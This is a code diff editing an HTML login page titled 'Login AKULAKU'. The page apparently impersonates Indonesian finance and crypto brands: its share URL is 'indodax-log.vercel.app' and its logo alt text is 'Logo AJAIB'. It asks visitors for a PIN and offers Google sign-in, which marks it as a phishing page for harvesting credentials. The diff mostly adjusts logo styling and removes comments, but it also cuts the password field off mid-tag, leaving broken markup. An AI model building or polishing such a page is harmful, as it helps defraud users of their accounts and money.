@@ -5,11 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Login AKULAKU</title>
 
-<!-- Meta Tags untuk Open Graph (agar gambar INDODAX muncul saat share link ke WhatsApp) -->
+<!-- Meta Tags untuk Open Graph -->
 <meta property="og:title" content="Masuk ke AKULAKU" />
 <meta property="og:description" content="Login ke akun AKULAKU Anda dengan aman." />
-<meta property="og:image" content="https://i.ibb.co.com/HfkBKY6W/images.png" /><!-- Gambar INDODAX dari link Anda -->
-<meta property="og:url" content="https://indodax-log.vercel.app/" /> <!-- Ganti dengan URL halaman Anda yang sebenarnya -->
+<meta property="og:image" content="https://i.ibb.co.com/HfkBKY6W/images.png" />
+<meta property="og:url" content="https://indodax-log.vercel.app/" />
 <meta property="og:type" content="website" />
 
 <style>
@@ -25,14 +25,17 @@
     max-width: 360px;
     margin: 0 auto;
   }
+  
+  /* --- PERUBAHAN PADA BAGIAN INI --- */
   .logo {
-    width: 100px; /* Sesuaikan ukuran logo sesuai kebutuhan */
-    height: auto;
-    margin-bottom: 32px;
+    width: 100%; /* Mengubah lebar menjadi 100% agar memenuhi container */
+    height: auto; /* Tinggi otomatis agar gambar tidak gepeng */
+    margin-bottom: 24px; /* Jarak dengan input field di bawahnya */
     display: block;
-    margin-left: auto;
-    margin-right: auto;
+    object-fit: contain; /* Memastikan gambar tidak terpotong */
   }
+  /* ------------------------------- */
+
   label {
     display: block;
     font-weight: 600;
@@ -43,7 +46,7 @@
   input[type="password"] {
     width: 100%;
     font-size: 14px;
-    padding: 12px 40px 12px 12px; /* padding right untuk icon mata */
+    padding: 12px 40px 12px 12px;
     border: 1px solid #ccc;
     border-radius: 6px;
     box-sizing: border-box;
@@ -131,7 +134,7 @@
 </head>
 <body>
   <div class="container">
-    <!-- Logo dengan link gambar baru -->
+    <!-- Logo dengan lebar penuh -->
     <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo AJAIB" class="logo" />
 
     <form id="loginForm" novalidate>
@@ -140,31 +143,7 @@
 
       <label for="password">PIN</label>
       <div class="password-container">
-        <input type="password" id="password" name="password" placeholder="Masukkan kata sandi" required />
-        <svg id="togglePassword" class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false">
-          <!-- mata terbuka -->
-          <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path>
-          <circle cx="12" cy="12" r="3"></circle>
-        </svg>
-      </div>
-
-      <a href="#" class="forgot-link">Lupa Kata Sandi?</a>
-
-      <button type="submit" id="loginBtn" class="login-btn" disabled>Masuk</button>
-    </form>
-
-    <div class="or-text">atau</div>
-
-    <button class="google-btn">
-      <svg class="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 533.5 544.3" aria-hidden="true" focusable="false">
-        <path fill="#4285F4" d="M533.5 278.4c0-18.5-1.5-36.4-4.4-53.8H272v101.9h146.8c-6.3 34-25.3 62.7-54.3 82v67h87.7c51.2-47.3 80.3-116.7 80.3-197.1z"/>
-        <path fill="#34A853" d="M272 544.3c73.6 0 135.7-24.3 180.9-65.8l-87.7-67c-24.3 16.3-55.5 26-93.2 26-71.6 0-132.3-48.3-154.1-113.6h-90.6v71.3c45.1 89.1 137.5 149.1 244.7 149.1z"/>
-        <path fill="#FBBC04" d="M117.9 321.1c-8.7-25.7-8.7-53.7 0-79.4v-71.3h-90.6c-37.7 73.8-37.7 161.1 0 234.9l90.6-71.3z"/>
-        <path fill="#EA4335" d="M272 107.7c39.9-.6 77.7 14.9 106.6 43l79.8-79.8C406.6 24.3 344.5 0 272 0 164.7 0 72.3 60 27.2 149.1l90.6 71.3c21.7-65.4 82.5-113.6 154.2-113.6z"/>
-      </svg>
-      Lanjut dengan Google
-    </button>
-  </div>
+        <input type="password" id="password" name
 
   <!-- Load jQuery dari CDN -->
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
